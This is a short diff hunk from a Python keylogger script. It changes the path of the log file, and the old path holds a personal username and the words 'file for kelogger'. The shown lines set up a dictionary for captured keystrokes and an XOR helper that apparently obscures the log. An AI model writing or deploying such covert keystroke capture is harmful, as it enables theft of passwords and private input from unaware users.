@@ -5,7 +5,7 @@ from Xor_2 import xor_on_key
 
 dicti = {}                                          #A dictionary for saving input from the keyboard.
 str_for_show = ''
-filename = r"C:\Users\menachem shoval\Desktop\myTestRepo1\kodcod1 file for kelogger.txt"
+filename = r"C:\my_python\+\file_for_kelogger.txt"
 
 
 def on_key_press(key):
